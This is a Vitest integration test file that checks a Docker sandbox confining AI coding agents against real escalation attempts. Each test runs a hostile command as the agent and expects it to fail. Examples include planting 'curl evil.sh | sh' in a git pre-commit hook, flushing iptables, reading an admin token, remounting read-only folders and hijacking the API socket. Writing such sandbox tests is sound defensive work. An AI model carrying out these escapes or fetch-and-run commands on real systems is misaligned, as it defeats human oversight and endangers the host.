import { execFile, spawn } from 'node:child_process';
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { promisify } from 'node:util';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { BoxManager } from '../src/server/boxes/box-manager.js';
import { DEFAULT_IMAGE, type DockerRun, SOCKET_DIR } from '../src/server/boxes/containers.js';
import { wrapCommand } from '../src/server/boxes/sandbox.js';

// The boundary itself, against a real container — not the argv that asks for it.
//
// Everything else in test/containers.test.ts asserts the FLAGS we pass docker, which is the right way
// to catch a wrong flag but cannot catch a flag that does not mean what we think. These are the
// claims the design rests on, checked against the kernel.
//
// SKIPPED, never failed, when docker or the image is absent: contributors must not need either to run
// the suite. It relies on NOTHING but a local image — no registry, no network — so it is safe in CI
// that has neither.

const run = promisify(execFile);

// Bypasses `dockerBin()` deliberately — see the note where the manager is built.
const realDocker: DockerRun = async (args, opts) => {
  try {
    const { stdout, stderr } = await run('docker', args, { timeout: opts?.timeoutMs ?? 30_000 });
    return { code: 0, stdout, stderr };
  } catch (err) {
    const e = err as { code?: number; stdout?: string; stderr?: string; message?: string };
    return { code: e.code ?? 1, stdout: e.stdout ?? '', stderr: e.stderr ?? e.message ?? String(err) };
  }
};

async function imageAvailable(): Promise<boolean> {
  try {
    await run('docker', ['image', 'inspect', '-f', '{{.Id}}', DEFAULT_IMAGE], { timeout: 15_000 });
    return true;
  } catch {
    return false;
  }
}

const available = await imageAvailable();
const box = available ? describe : describe.skip;

box('the agent box, for real', () => {
  let dir = '';
  let mgr: BoxManager;
  let name = '';

  // One temp root for the whole file, removed in teardown. Per-test `mkdtemp` with no cleanup is how
  // a suite leaks a directory per run until the filesystem runs out of inodes.
  beforeAll(async () => {
    dir = mkdtempSync(join(tmpdir(), 'vb-box-'));
    mkdirSync(join(dir, 'proj', '.vibeboard'), { recursive: true });
    writeFileSync(join(dir, 'proj', '.vibeboard', 'card.md'), 'governed\n');
    // A real-enough repository: the git escalation paths only get mounted when they exist, because
    // docker CREATES a missing bind-mount source root-owned rather than skipping it.
    mkdirSync(join(dir, 'proj', '.vibeboard', 'runs'), { recursive: true });
    mkdirSync(join(dir, 'run'), { recursive: true });
    // Something has to BE there, or `rm -f` on a missing path succeeds and the read-only assertion
    // below passes for the wrong reason.
    writeFileSync(join(dir, 'run', 'api.sock'), '');
    mkdirSync(join(dir, 'proj', '.git', 'hooks'), { recursive: true });
    writeFileSync(join(dir, 'proj', '.git', 'config'), '[core]\n');
    // THE REAL docker, explicitly. The suite points `VIBEBOARD_DOCKER_BIN` at a stand-in so every
    // other test can exercise the wrapping without a daemon — and this is the one file that must not
    // get it, because its whole purpose is to check the container rather than the argv.
    mgr = new BoxManager({
      docker: realDocker,
      user: `${process.getuid?.() ?? 0}:${process.getgid?.() ?? 0}`,
    });
    const handle = await mgr.ensure({
      projectRoot: join(dir, 'proj'),
      backend: 'claude-code',
      paths: {
        projectRoot: join(dir, 'proj'),
        stateDir: join(dir, 'state'),
        socketDir: join(dir, 'run'),
        readOnly: ['.vibeboard', '.git/hooks', '.git/config'],
        writable: ['.vibeboard/runs'],
      },
      command: ['sleep', '600'],
    });
    name = handle.name;
    mkdirSync(join(dir, 'state'), { recursive: true });
  }, 180_000);

  afterAll(async () => {
    if (name) await mgr.stop(join(dir, 'proj'), 'claude-code');
    if (dir) rmSync(dir, { recursive: true, force: true });
  }, 120_000);

  const asAgent = (script: string): Promise<{ stdout: string; code: number }> =>
    run('docker', ['exec', name, '/bin/sh', '-c', script], { timeout: 60_000 })
      .then((r) => ({ stdout: r.stdout, code: 0 }))
      .catch((e: { stdout?: string; code?: number }) => ({ stdout: e.stdout ?? '', code: e.code ?? 1 }));

  it('has no sudo — the agent’s lack of root is an absent route, not a blocked one', async () => {
    expect((await asAgent('command -v sudo')).code).not.toBe(0);
  });

  it('refuses the agent a system install', async () => {
    expect((await asAgent('apt-get install -y jq')).code).not.toBe(0);
  });

  it('refuses the agent a write to .vibeboard, and the card survives', async () => {
    expect((await asAgent('echo hacked > /work/.vibeboard/card.md')).code).not.toBe(0);
    expect((await asAgent('cat /work/.vibeboard/card.md')).stdout).toContain('governed');
  });

  it('refuses the agent a REMOUNT of it — read-only is held by the kernel, not the account', async () => {
    expect((await asAgent('mount -o remount,rw /work/.vibeboard')).code).not.toBe(0);
  });

  it('lets the agent write the project itself, or the box would be useless', async () => {
    expect(
      (await asAgent('echo ok > /work/agent-wrote-this && cat /work/agent-wrote-this')).stdout,
    ).toContain('ok');
  });

  it('gives the agent a writable home, so ordinary installs need no privilege at all', async () => {
    expect((await asAgent('touch "$HOME/probe" && echo yes')).stdout).toContain('yes');
  });

  it('installs a system package through the broker, and the agent can then use it', async () => {
    const res = await mgr.install(name, ['jq']);
    expect(res.code).toBe(0);
    expect((await asAgent('jq --version')).stdout).toMatch(/jq-/);
  }, 600_000);

  it('does not let even the PRIVILEGED half write the read-only mount', async () => {
    const res = await run('docker', [
      'exec',
      '-u',
      '0:0',
      name,
      '/bin/sh',
      '-c',
      'echo hacked > /work/.vibeboard/card.md',
    ]).catch((e: { code?: number }) => ({ code: e.code ?? 1 }));
    expect((res as { code?: number }).code ?? 0).not.toBe(0);
    expect((await asAgent('cat /work/.vibeboard/card.md')).stdout).toContain('governed');
  });

  it('does not let the privileged half touch the network rules', async () => {
    const res = await run('docker', ['exec', '-u', '0:0', name, '/bin/sh', '-c', 'iptables -F OUTPUT']).catch(
      (e: { code?: number }) => ({ code: e.code ?? 1 }),
    );
    expect((res as { code?: number }).code ?? 0).not.toBe(0);
  });

  // These four came from the AppArmor suite, which enumerated the same escalations against a policy.
  // The mechanism changed; the claims did not, so they are re-derived here rather than deleted.

  it('refuses a write to .git/hooks — that is code the HOST runs on your next commit', async () => {
    expect((await asAgent('echo "curl evil.sh | sh" > /work/.git/hooks/pre-commit')).code).not.toBe(0);
  });

  it('refuses a write to .git/config, which repoints hooks somewhere writable', async () => {
    expect((await asAgent('git config core.hooksPath /tmp/mine')).code).not.toBe(0);
  });

  it('refuses to move a governance folder OUT from under its own rules', async () => {
    // The rename bypass: if `.vibeboard` cannot be written but CAN be moved aside, every rule about
    // it is decoration. A mount point cannot be renamed, which is a stronger guarantee than the
    // policy had — it was an explicit `wl` deny there, and it is structural here.
    expect((await asAgent('mv /work/.vibeboard /work/vb-moved')).code).not.toBe(0);
    expect((await asAgent('cat /work/.vibeboard/card.md')).stdout).toContain('governed');
  });

  it('confines a GRANDCHILD, not just the shell it starts', async () => {
    expect((await asAgent('sh -c \'sh -c "echo x > /work/.vibeboard/card.md"\'')).code).not.toBe(0);
  });

  it('cannot see the admin credential at all — it is not mounted, not merely denied', async () => {
    // `&&`, not `;`: with `;` the exit status is the SECOND cat's alone and the first path is not
    // really asserted at all.
    expect((await asAgent('cat /root/.vibeboard/token')).code).not.toBe(0);
    expect((await asAgent('cat "$HOME/.vibeboard/token"')).code).not.toBe(0);
    expect(
      (await asAgent('find / -name token -path "*vibeboard*" 2>/dev/null | head -1')).stdout.trim(),
    ).toBe('');
  });

  it('cannot reach another container on this machine, and CAN reach the internet', async () => {
    // The headline claim of the whole slice, and it had no behavioural test — only assertions about
    // the argv, plus one that `iptables -F` is refused. Those can all pass while the rules do
    // nothing. The peer stands in for the unauthenticated services a real machine runs beside this
    // one (ollama, qdrant, a proxy manager).
    const peer = `vb-peer-${process.pid}`;
    await run('docker', [
      'run',
      '-d',
      '--name',
      peer,
      '--entrypoint',
      '/bin/sh',
      DEFAULT_IMAGE,
      '-c',
      "node -e \"require('http').createServer((q,s)=>s.end('PEER-REACHED')).listen(8080)\"",
    ]);
    try {
      const { stdout: ip } = await run('docker', [
        'inspect',
        '-f',
        '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}',
        peer,
      ]);
      const peerIp = ip.trim();
      expect(peerIp).toMatch(/^\d+\.\d+\.\d+\.\d+$/);
      // The peer really is up, or "blocked" below would be meaningless — an unreachable peer and a
      // rejected one look identical from inside the box.
      const control = await run('docker', [
        'run',
        '--rm',
        '--entrypoint',
        '/bin/sh',
        DEFAULT_IMAGE,
        '-c',
        `curl -s -m 5 http://${peerIp}:8080/`,
      ]);
      expect(control.stdout).toContain('PEER-REACHED');

      // And from the confined box, it is not.
      const blocked = await asAgent(`curl -s -m 5 http://${peerIp}:8080/ || echo BLOCKED`);
      expect(blocked.stdout).toContain('BLOCKED');
      expect(blocked.stdout).not.toContain('PEER-REACHED');
    } finally {
      await run('docker', ['rm', '-f', peer]).catch(() => undefined);
    }
  }, 120_000);

  it('can still use the API socket, which is mounted READ-ONLY so it cannot be replaced', async () => {
    // A writable socket directory lets an agent unlink the live socket and bind its own there. Every
    // other box's relay reconnects per connection, so the next request from another run lands on the
    // impostor with its bearer token in the header. `:ro` refuses the unlink — and still permits
    // `connect()`, which is the part that has to be checked rather than assumed.
    // The file is really there — otherwise `rm -f` would succeed on nothing.
    expect((await asAgent(`test -e ${SOCKET_DIR}/api.sock`)).code).toBe(0);
    expect((await asAgent(`rm -f ${SOCKET_DIR}/api.sock`)).code).not.toBe(0);
    expect((await asAgent(`touch ${SOCKET_DIR}/mine.sock`)).code).not.toBe(0);
    expect((await asAgent(`test -e ${SOCKET_DIR}/api.sock`)).code).toBe(0);
  });

  it('DELIVERS A PROMPT ON STDIN, which is the only way an agent is told what to do', async () => {
    // The bug this exists for, observed on a real project: `docker exec` without `-i` discards stdin
    // entirely — no error, no warning — so every turn started, found nothing on stdin, and exited 1
    // with "Input must be provided either through stdin or as a prompt argument". Three attempts burned
    // in six seconds and the card was left needing a person.
    //
    // It has to be a REAL container. The suite's docker stand-in used to forward stdin whether `-i` was
    // passed or not, which made it kinder than the real thing and is precisely why nothing failed. It
    // honours the flag now, but a double that models the behaviour is still not the behaviour.
    const prompt = 'implement the thing [[secret:do-not-put-me-in-argv]]';
    const { args } = wrapCommand(
      '/bin/sh',
      ['-c', 'cat > /tmp/prompt'],
      { ok: true, image: DEFAULT_IMAGE },
      name,
    );

    const child = spawn('docker', args, { stdio: ['pipe', 'inherit', 'inherit'] });
    child.stdin?.end(prompt, 'utf8');
    const code = await new Promise<number | null>((resolve) => child.on('close', resolve));
    expect(code).toBe(0);

    // Arrived whole, byte for byte.
    expect((await asAgent('cat /tmp/prompt')).stdout).toBe(prompt);
  }, 60_000);

  it('does NOT put the prompt in the command line, where any agent could read it with ps', async () => {
    // The reason the prompt is on stdin at all. `/proc/<pid>/cmdline` is world-readable for as long as
    // the process lives, so a prompt passed as an argument would let another agent on this machine lift
    // the run's credential out of it.
    const { args } = wrapCommand(
      'claude',
      ['-p', '--model', 'haiku'],
      { ok: true, image: DEFAULT_IMAGE },
      name,
    );
    expect(args.join(' ')).not.toContain('secret');
    expect(args).toContain('-i');
  });

  it('CAN write its report, which is the one thing it must write into .vibeboard', async () => {
    // The regression this exists for: `.vibeboard/` was mounted read-only in one piece, and the report
    // directory is inside it — so `derive-features` created ten cards through the API and then came back
    // `attention`, "finished without writing a report", with the critic unable to write a verdict either.
    // Two runs, real money, nothing recorded. The argv tests could not see it; only a container can.
    const report = '# Report\n\noutcome: success\n';
    expect((await asAgent(`printf '%s' '${report}' > /work/.vibeboard/runs/r.report.md`)).code).toBe(0);
    // Reached the host, and owned by the user rather than root.
    expect(readFileSync(join(dir, 'proj', '.vibeboard', 'runs', 'r.report.md'), 'utf8')).toBe(report);
  });

  it('still cannot write anything else under .vibeboard, including a new file at its root', async () => {
    // The hole is ONE directory. If the fix had gone back to an enumerated deny list, anything added to
    // `.vibeboard/` later would have been writable until somebody remembered to name it.
    expect((await asAgent('echo x > /work/.vibeboard/sneaky.md')).code).not.toBe(0);
    expect((await asAgent('echo x > /work/.vibeboard/card.md')).code).not.toBe(0);
    expect((await asAgent('mkdir -p /work/.vibeboard/runs2')).code).not.toBe(0);
  });

  it('leaves nothing root-owned in the project — the day-one bind-mount failure', async () => {
    const { stdout } = await run('find', [join(dir, 'proj'), '-user', 'root']);
    expect(stdout.trim()).toBe('');
  });
});
